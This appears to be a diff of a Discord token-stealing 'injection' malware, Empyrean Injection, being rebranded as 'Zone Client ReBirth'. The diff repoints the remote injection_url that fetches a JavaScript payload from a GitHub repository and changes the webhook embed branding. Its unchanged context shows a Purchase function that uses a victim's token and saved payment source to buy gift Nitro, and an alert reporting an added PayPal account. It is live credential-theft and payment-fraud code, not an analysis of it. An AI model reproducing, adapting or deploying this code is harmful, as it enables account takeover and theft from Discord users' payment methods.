@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Empyrean Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
+  embed_name: 'Zone Client ReBirth', 
+  embed_icon: 'https://github.com/ronaldsbroker/injec/blob/main/rick.jpg?raw=true', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/ronaldsbroker/injec/main/clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -517,7 +517,7 @@ const Purchase = async (token, id, _type, _time) => {
     gift: true,
     payment_source_id: id,
     payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
+    purchase_token: '121',
     sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
   };
 
@@ -780,7 +780,7 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `Time to buy some nitro baby 😁`,
             inline: false,
           },
           {
